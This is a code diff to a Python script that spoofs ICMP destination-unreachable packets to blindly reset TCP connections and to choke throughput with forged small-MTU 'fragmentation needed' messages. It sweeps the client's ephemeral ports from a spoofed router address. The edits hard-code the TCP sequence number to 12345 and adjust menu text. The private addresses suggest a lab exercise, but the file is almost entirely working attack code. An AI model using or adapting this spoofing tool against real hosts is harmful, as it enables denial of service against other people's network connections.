@@ -4,7 +4,6 @@ import random
 import time
 
 ## client port guessing -  commonly 49152–65535 on Linux
-
 CLIENT_IP = "10.0.0.2"        # Target client
 SERVER_IP = "10.0.0.1"        # Target server  
 ATTACKER_IP = "192.168.1.1"   # Spoofed router IP for throughput attack
@@ -15,13 +14,13 @@ icmp_reset_code = 3
 
 def get_port_scan_strategy():
     """Return port scanning strategy for blind attack"""
-    print("[ATTACKER] As a blind attacker, I must guess the client port...")
+    print("[ATTACKER] As a blind attacker, you must guess the client port...")
     print("Strategies:")
     print("1. Random sampling (1000 random ports) - realistic and fast")
     print("2. Sequential scan (every 10th port) - systematic but slow")  
     print("3. Full brute force (all 32768 ports) - guaranteed but very slow")
     
-    choice = input("Select scanning strategy (1-4): ")
+    choice = input("Select scanning strategy (1-3): ")
     if choice == "1":
         return "random", "Random sampling"
     elif choice == "2": 
@@ -128,12 +127,12 @@ def icmp_connection_reset(sock, strategy="random"):
     if strategy == "random":
         print("[ATTACKER] Using random port sampling...")
         # Generate 1000 random ports in ephemeral range
-        ports = random.sample(range(32768, 65536), min(1000, 65536-32768))
-        
+        ports = random.sample(range(32768, 65536), min(1000, 65536-32768))      
         for port in ports:
             # Try multiple sequence numbers per port
             for _ in range(3):
-                seq = random.randint(0, MAX_SEQ)
+                #seq = random.randint(0, MAX_SEQ)
+                seq = 12345
                 
                 embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
                 rest_of_header = b"\x00\x00\x00\x00"
@@ -155,7 +154,8 @@ def icmp_connection_reset(sock, strategy="random"):
         for offset in range(10):  # 10 different starting points
             for port in range(32768 + offset, 65536, 10):
                 for _ in range(2):  # 2 sequence attempts per port
-                    seq = random.randint(0, MAX_SEQ)
+                    #seq = random.randint(0, MAX_SEQ)
+                    seq = 12345
                     
                     embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
                     rest_of_header = b"\x00\x00\x00\x00"
@@ -164,10 +164,8 @@ def icmp_connection_reset(sock, strategy="random"):
                     
                     packet = ip_header + icmp_header + embedded
                     sock.sendto(packet, (CLIENT_IP, 0))
-                    attack_count += 1
-                    
-                time.sleep(0.0005)
-                
+                    attack_count += 1                   
+                time.sleep(0.0005)                
             print(f"[+] Completed pass {offset + 1}/10...")
             
     elif strategy == "full":
@@ -175,7 +173,8 @@ def icmp_connection_reset(sock, strategy="random"):
         for port in range(32768, 65536):
             # Try 2 sequence numbers per port
             for _ in range(2):
-                seq = random.randint(0, MAX_SEQ)
+                #seq = random.randint(0, MAX_SEQ)
+                seq = 12345
                 
                 embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
                 rest_of_header = b"\x00\x00\x00\x00"
@@ -206,7 +205,8 @@ def icmp_throughput_reduction(sock, strategy="random"):
         
         for port in ports:
             for _ in range(2):  # 2 sequence attempts per port
-                seq = random.randint(0, MAX_SEQ)
+                #seq = random.randint(0, MAX_SEQ)
+                seq = 12345
                 
                 embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
                 mtu_bytes = struct.pack("!HH", 0, NEXT_HOP_MTU)
@@ -245,17 +245,17 @@ def icmp_throughput_reduction(sock, strategy="random"):
     elif strategy == "full":
         print("[ATTACKER] Using full brute force scan...")
         for port in range(32768, 65536):
-            for _ in range(2):
-                seq = random.randint(0, MAX_SEQ)
+            #seq = random.randint(0, MAX_SEQ)
+            seq = 12345
                 
-                embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
-                mtu_bytes = struct.pack("!HH", 0, NEXT_HOP_MTU)
-                icmp_header = build_icmp_header(3, 4, mtu_bytes, embedded)
-                ip_header = build_ip_header(ATTACKER_IP, CLIENT_IP, len(icmp_header) + len(embedded))
+            embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
+            mtu_bytes = struct.pack("!HH", 0, NEXT_HOP_MTU)
+            icmp_header = build_icmp_header(3, 4, mtu_bytes, embedded)
+            ip_header = build_ip_header(ATTACKER_IP, CLIENT_IP, len(icmp_header) + len(embedded))
                 
-                packet = ip_header + icmp_header + embedded
-                sock.sendto(packet, (CLIENT_IP, 0))
-                attack_count += 1
+            packet = ip_header + icmp_header + embedded
+            sock.sendto(packet, (CLIENT_IP, 0))
+            attack_count += 1
                 
             if port % 1000 == 768:
                 print(f"[+] Scanned up to port {port}... (MTU={NEXT_HOP_MTU})")
@@ -277,7 +277,7 @@ if __name__ == "__main__":
     print("This simulates a realistic blind attacker who must guess connection details")
     print()
     print("Attack Types:")
-    print("1. Connection Reset Attack (ICMP Type 3, Code 1)")
+    print("1. Connection Reset Attack (ICMP Type 3, Code 3)")
     print("2. Throughput Reduction Attack (ICMP Type 3, Code 4)") 
     print("3. Both Attacks")
     
